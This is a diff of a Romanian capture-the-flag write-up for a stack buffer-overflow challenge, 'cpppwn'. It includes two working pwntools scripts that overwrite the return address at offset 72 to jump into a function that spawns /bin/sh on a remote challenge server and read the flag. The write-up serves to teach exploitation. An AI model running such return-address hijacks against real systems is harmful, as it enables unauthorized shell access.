@@ -34,7 +34,7 @@ Si obtinem doua fisiere:
 
 3. Citirea codului sursa *main.cpp*
 
-<p align="center"><img src="hk_dey.7/CTF-WRITEUPS/Vianu_CTF/PWN/cpppwn/imagini/main.png" width="50%"/></p>
+<p align="center"><img src="imagini/main.png" width="50%"/></p>
 
 Ce intelegem din cod?
 
@@ -150,7 +150,7 @@ Acum ca stim unde este string-ul, cautam ce cod foloseste aceasta adresa *402008
 
 si observam ca sa gasit, ceea ce se vede cu rosu la aceea imagine de mai jos:
 
-<p align="center"><img src="/home/hack/hk_dey.7/CTF-WRITEUPS/Vianu_CTF/PWN/cpppwn/imagini/objdump.png" width="50%"/></p>
+<p align="center"><img src="imagini/objdump.png" width="50%"/></p>
 
 Intelegere:
 
@@ -161,7 +161,7 @@ Gasim inceputul functiei **win()**:
 
 uitandu-ne mai jos in codul dezassemblat:
 
-<p align="center"><img src="/home/hack/hk_dey.7/CTF-WRITEUPS/Vianu_CTF/PWN/cpppwn/imagini/objdump1.png" width="50%"/></p>
+<p align="center"><img src="/imagini/objdump1.png" width="50%"/></p>
 
 Functia **win()** incepe la adresa **0x4011b9**!
 
@@ -219,8 +219,8 @@ Caractere 73-80 vor fi noua noastra adresa de retur!
 ---
 Ce face fiecare linie?
 ---
-1. ** from pwn import ** - importa tools pentru exploit
-2. ** p = remote('dpl.razvan.sh', 30002)** - Se conecteaza la server
+1. **from pwn import** - importa tools pentru exploit
+2. **p = remote('dpl.razvan.sh', 30002)** - Se conecteaza la server
 3. **recvuntil()** - asteapta pana cand primeste mesajul programului
 4. **p64(win_addr)** - transforma adresa **0x4011b9** in formatul corect pentru procesor (little-endian)
 5. **sendline()** - trimite payload-ul + Enter
@@ -230,7 +230,7 @@ Ce face fiecare linie?
 
 9. Din acel cod creat hai sa-l rulam si sa vedem ce ne afiseaza:
 
-<p align="center"><img src="/home/hack/hk_dey.7/CTF-WRITEUPS/Vianu_CTF/PWN/cpppwn/imagini/file1.png" width="50%"/></p>
+<p align="center"><img src="imagini/file1.png" width="50%"/></p>
 
 Dupa cum putem observa cand am introdus comanda "ls" de doua ori, shell-ul nostru sa inchis, dar de ce?
 
@@ -245,7 +245,7 @@ programul crapa si se inchide
 
 Privim codul dezassemblat din nou:
 
-<p align="center"><img src="/home/hack/hk_dey.7/CTF-WRITEUPS/Vianu_CTF/PWN/cpppwn/imagini/objdump2.png" width="50%"/></p>
+<p align="center"><img src="imagini/objdump2.png" width="50%"/></p>
 
 Observati importante:
 
@@ -259,69 +259,68 @@ Daca sarim direct la *0x4011d6*, evitam problema cu *cout* si stiva ramane mai s
 Bonus cu doua exploite FUNCTIONABILE:
 
 ---
-Primul exploit:
+#Primul exploit:
 ---
 
-#!/usr/bin/env python3
-from pwn import *
+                       #!/usr/bin/env python3
+                       from pwn import *
 
-# Conectare la server
-p = remote('dpl.razvan.sh', 30002)
+                       # Conectare la server
+                       p = remote('dpl.razvan.sh', 30002)
 
-# Așteaptă prompt-ul
-p.recvuntil(b"Show me what you got\n")
+                       # Așteaptă prompt-ul
+                       p.recvuntil(b"Show me what you got\n")
 
-# Offset calculat
-offset = 72
+                       # Offset calculat
+                       offset = 72
 
-# NU mai sarim la începutul win() (0x4011b9)
-# Sarim direct unde se încarcă /bin/sh pentru system()
-jump_addr = 0x4011d6
+                       # NU mai sarim la începutul win() (0x4011b9)
+                       # Sarim direct unde se încarcă /bin/sh pentru system()
+                       jump_addr = 0x4011d6
 
-# Payload-ul magic
-payload = b'A' * offset  # Padding până la adresa de retur
-payload += p64(jump_addr)  # Noua adresă de retur
+                       # Payload-ul magic
+                       payload = b'A' * offset  # Padding până la adresa de retur
+                       payload += p64(jump_addr)  # Noua adresă de retur
 
-# Trimite exploit-ul
-p.sendline(payload)
+                       # Trimite exploit-ul
+                       p.sendline(payload)
 
-# Acum avem shell! Trimite comenzi:
-p.sendline(b"ls")  # Listează fișierele
-p.sendline(b"cat flag*")  # Caută și citește fișiere care încep cu "flag"
+                       # Acum avem shell! Trimite comenzi:
+                       p.sendline(b"ls")  # Listează fișierele
+                       p.sendline(b"cat flag*")  # Caută și citește fișiere care încep cu "flag"
 
-# Obține răspunsul
-print(p.recvall(timeout=3).decode())
+                       # Obține răspunsul
+                       print(p.recvall(timeout=3).decode())
 
-# Închide conexiunea
-p.close()
+                       # Închide conexiunea
+                       p.close()
 
 Cand vei rula, va afisa direct flag-ul
 
-
 ---
-Al doilea exploit
+#Al doilea exploit
 ---
 
-#!/usr/bin/env python3
-from pwn import *
+                        #!/usr/bin/env python3
+                        from pwn import *
 
-def exploit():
-    p = remote('dpl.razvan.sh', 30002)
-    p.recvuntil(b"Show me what you got\n")
+                        def exploit():
+                            p = remote('dpl.razvan.sh', 30002)
+                            p.recvuntil(b"Show me what you got\n")
     
-    offset = 72
+                            offset = 72
     
-    # Încearcă să sari direct la instrucțiunea care încarcă /bin/sh
-    # 0x4011d6 - unde se încarcă adresa string-ului "/bin/sh"
-    jump_to_system = 0x4011d6
+                            # Încearcă să sari direct la instrucțiunea care încarcă /bin/sh
+                            # 0x4011d6 - unde se încarcă adresa string-ului "/bin/sh"
+                            jump_to_system = 0x4011d6
     
-    payload = b'A' * offset
-    payload += p64(jump_to_system)
+                            payload = b'A' * offset
+                            payload += p64(jump_to_system)
     
-    p.sendline(payload)
-    p.interactive()
+                            p.sendline(payload)
+                            p.interactive()
 
-exploit()
+                        exploit()
 
 Cand vei rula, e sa introduci tu comenzile si sa iti afiseze flag-ul
 mai precis cu *ls* si apoi cu *cat* de a afisa flag final
